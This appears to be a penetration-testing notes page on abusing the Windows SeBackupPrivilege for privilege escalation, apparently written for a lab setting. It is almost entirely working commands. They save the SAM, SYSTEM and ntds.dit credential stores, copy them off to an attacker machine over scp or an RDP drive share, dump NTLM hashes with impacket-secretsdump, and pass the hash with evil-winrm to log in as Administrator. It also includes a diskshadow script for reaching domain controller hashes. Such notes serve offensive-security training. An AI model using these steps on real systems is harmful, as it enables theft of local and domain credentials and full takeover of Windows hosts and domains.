# SeBackupPrivilege

Check privileges:

```powershell
whoami /priv
```

* SeBackupPrivilege must be present

[NLTM](../nltm.md)

#### Exploitation:

1. Create a temp directory:

```powershell
mkdir C:\temp
```

2. Copy the sam and system hive of HKLM to C:\temp and then download them.

```powershell
reg save hklm\sam C:\temp\sam.hive
```

and

```powershell
reg save hklm\system C:\temp\system.hive
```

3. Transfer files to kali machine

**Enable drive direction on RDP session:**

{% code overflow="wrap" %}
```sh
xfreerdp /v:192.168.224.220 /u:dave /p:lab +clipboard /cert:ignore /drive:KaliShare,/home/kali/share
```
{% endcode %}

**If SSH is available:**

```shell
sudo systemctl start ssh
#on kali
```

```powershell
scp C:\temp\sam.hive kali@192.168.X.X:/home/kali/
```

4. Obtain ntlm hashes:

{% code overflow="wrap" %}
```sh
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```
{% endcode %}

5. Use evil-winrm to pass the hash and connect as Local Administrator:

```sh
evil-winrm -i <ip> -u "Administrator" -H "<hash>"
```



If you're on a domain controller and notice your current user has `SeRestore` / `SeBackup` privilege, then you can access the `ntds.dit` (hashes of all domain accounts) by first:

{% code title="script.txt" %}
```
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```
{% endcode %}

Storing the above in `script.txt`, then navigate to `C:\Windows\System32\`

Then run the following command:

```
.\diskshadow /s C:\Users\YOURUSER\Desktop\script.txt
```

You can then access the contents of `ntds` by doing a `robocopy`

{% code overflow="wrap" %}
```
robocopy /b E:\Windows\ntds C:\Users\YOURUSER\Desktop\ntds
```
{% endcode %}

You can then get the hashes similarly to how you would with the SAM / SYSTEM files

{% code overflow="wrap" %}
```
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```
{% endcode %}
